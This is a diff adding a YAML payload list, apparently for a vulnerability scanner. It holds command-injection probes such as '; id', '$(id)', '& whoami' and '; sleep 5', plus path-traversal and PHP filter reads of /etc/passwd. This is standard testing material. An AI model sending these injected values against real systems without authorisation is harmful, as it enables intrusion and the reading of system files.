@@ -1,0 +1,38 @@
+﻿payloads:
+  - payload: "; id"
+    description: Semicolon command injection
+    platform: unix
+    severity: critical
+  - payload: "| id"
+    description: Pipe command injection
+    platform: unix
+    severity: critical
+  - payload: "$(id)"
+    description: Command substitution
+    platform: unix
+    severity: critical
+  - payload: "`id`"
+    description: Backtick substitution
+    platform: unix
+    severity: critical
+  - payload: "& whoami"
+    description: Windows command injection
+    platform: windows
+    severity: critical
+  - payload: "| dir"
+    description: Windows pipe injection
+    platform: windows
+    severity: critical
+  - payload: "; sleep 5"
+    description: Time-based blind injection (5s)
+    platform: unix
+    severity: critical
+    time_based: true
+  - payload: "../../../etc/passwd"
+    description: LFI traversal to passwd
+    platform: unix
+    severity: high
+  - payload: "php://filter/convert.base64-encode/resource=/etc/passwd"
+    description: PHP filter LFI
+    platform: php
+    severity: high
